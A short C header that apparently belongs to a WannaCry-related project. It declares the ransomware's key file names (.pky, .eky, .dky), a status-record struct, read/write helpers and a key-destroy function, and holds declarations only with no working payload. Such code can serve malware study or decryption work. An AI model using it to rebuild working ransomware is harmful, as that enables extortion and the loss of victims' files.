#pragma once

#include <Windows.h>
#include <tchar.h>

#define BASE_DIRNAME _T("WANNATRY")

#define PKYFILENAME _T("00000000.pky")
#define EKYFILENAME _T("00000000.eky")
#define DKYFILENAME _T("00000000.dky")
#define RESFILENAME _T("00000000.res")

struct RESDATA {
	UCHAR m_nID[8];
	UCHAR m_unknown1[0x60 - sizeof(m_nID)];
	DWORD m_ExecTime;
	UCHAR m_unknown2[16];
	DWORD m_EndTime;
	DWORD m_StartTime;
	DWORD m_nFileCount;
	ULONG64 m_cbFileTotal;
};

typedef RESDATA* PRESDATA;

#define GetPkyFileName(p) \
	(WanaFileName(p, PKYFILENAME))
#define GetEkyFileName(p) \
	(WanaFileName(p, EKYFILENAME))
#define GetDkyFileName(p) \
	(WanaFileName(p, DKYFILENAME))

#define ReadPkyFile(p, c, b) \
	(ReadWanaFile(PKYFILENAME, p, c, b))
#define ReadEkyFile(p, c, b) \
	(ReadWanaFile(EKYFILENAME, p, c, b))
#define ReadDkyFile(p, c, b) \
	(ReadWanaFile(DKYFILENAME, p, c, b))

#define WritePkyFile(p, c, b) \
	(WriteWanaFile(PKYFILENAME, p, c, b))
#define WriteEkyFile(p, c, b) \
	(WriteWanaFile(EKYFILENAME, p, c, b))
#define WriteDkyFile(p, c, b) \
	(WriteWanaFile(DKYFILENAME, p, c, b))
#define WriteResFile(p) \
	(WriteWanaFile(RESFILENAME, (PUCHAR)p, sizeof(RESDATA), NULL))

BOOL WanaFileName(TCHAR*, LPCTSTR);
BOOL ReadWanaFile(LPCTSTR, PUCHAR, DWORD, PDWORD);
BOOL WriteWanaFile(LPCTSTR, PUCHAR, DWORD, PDWORD);
BOOL ReadResFile(PRESDATA);
BOOL WanaDestroyKey();